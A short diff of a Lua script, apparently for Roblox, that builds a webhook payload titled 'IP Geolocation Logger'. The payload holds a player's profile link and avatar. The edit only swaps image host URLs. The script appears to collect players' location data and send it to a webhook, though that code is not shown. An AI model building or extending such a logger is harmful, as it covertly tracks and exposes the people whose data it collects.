@@ -48,12 +48,12 @@ local payload = {
 			url = "https://www.roblox.com/users/" .. player.UserId .. "/profile",
 			color = 1733608,
 			image = {
-				url = avatarSuccess and avatarUrl or "https://i.ibb.co/tPYH7jS6/No-Image-Available.jpg"
+				url = avatarSuccess and avatarUrl or "https://i.ibb.co.com/tPYH7jS6/No-Image-Available.jpg"
 			}
 		}
 	},
 	username = "IP Geolocation Logger",
-	avatar_url = "https://i.ibb.co/spwWKyBW/Globe-With-Meridians.png"
+	avatar_url = "https://i.ibb.co.com/spwWKyBW/Globe-With-Meridians.png"
 }
 
 pcall(function()
